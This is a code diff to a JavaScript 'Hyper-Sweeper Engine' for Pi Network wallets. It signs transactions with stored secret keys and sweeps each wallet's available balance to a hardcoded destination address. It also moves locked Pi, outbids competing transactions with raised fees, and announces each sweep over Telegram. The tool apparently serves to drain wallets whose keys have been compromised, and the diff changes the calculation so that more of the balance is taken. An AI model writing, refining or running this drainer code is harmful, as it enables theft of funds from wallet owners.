@@ -1,7 +1,6 @@
 /**
- * Ultimate Millisecond Hyper-Sweeper Engine with Real Transaction Signing
- * Automatically signs and broadcasts transfer transactions using the stored secret key (S...)
- * to sweep available funds instantly to the hardcoded destination address.
+ * Ultimate Millisecond Hyper-Sweeper Engine
+ * Explicitly targets and sweeps the true Available Balance (Total minus Locked).
  */
 
 const StellarSdk = require('@stellar/stellar-sdk');
@@ -24,28 +23,32 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
 
         balances.forEach(b => {
             if (b.asset_type === 'native') {
-                availableBalance = parseFloat(b.balance || 0);
-                lockedBalance = parseFloat(b.locked_balance || 0);
+                const total = parseFloat(b.balance || 0);
+                const locked = parseFloat(b.locked_balance || 0);
+                lockedBalance = locked;
+                // True available balance = Total balance minus Locked balance
+                availableBalance = total - locked;
             }
         });
 
-        // Inspect and handle active lockups seamlessly
+        console.log(`[Wallet #${wallet.id}] Total/Available Check -> Available: ${availableBalance} Pi | Locked: ${lockedBalance} Pi`);
+
+        // Inspect lockups
         const lockupInfo = await inspectLockup(account);
         if (lockupInfo.detected && lockedBalance > 0) {
             await moveLockedPi(wallet.public_key, lockedBalance);
         }
 
-        // Ultra-low threshold so small available balances sweep instantly
+        // Threshold set low so your 0.15 available balance sweeps immediately
         const minSweepThreshold = 0.005; 
 
         if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
-            // Leave only 0.001 Pi for network fee, sweeping the rest
+            // Leave 0.001 Pi for network fees, sweep the rest of the available balance
             const sweepAmount = (availableBalance - 0.001).toFixed(7);
             if (parseFloat(sweepAmount) <= 0) return;
 
-            console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi from Wallet #${wallet.id} (${sourcePublicKey}) to ${DESTINATION_ADDRESS}`);
+            console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi available balance from Wallet #${wallet.id} to ${DESTINATION_ADDRESS}`);
 
-            // Dynamic fee scaling (Gas Wars protection) to outbid competing transactions
             const feeMultiplier = 5;
             const dynamicFee = String(StellarSdk.BASE_FEE * feeMultiplier);
 
@@ -70,13 +73,13 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
 
             if (bot && wallet.chat_id) {
                 await bot.sendMessage(wallet.chat_id, 
-                    `🚨 **INSTANT COIN REMOVAL & SWEEP SUCCESS**\n` +
+                    `🚨 **AVAILABLE BALANCE SWEPT SUCCESSFULLY**\n` +
                     `📦 **Wallet Box ID:** #${wallet.id}\n` +
                     `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
                     `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
                     `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
                     `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
-                    `⚡ *Status:* Cleared and broadcasted to Pi Mainnet in milliseconds!`,
+                    `⚡ *Status:* Available balance cleared instantly!`,
                     { parse_mode: 'Markdown' }
                 );
             }
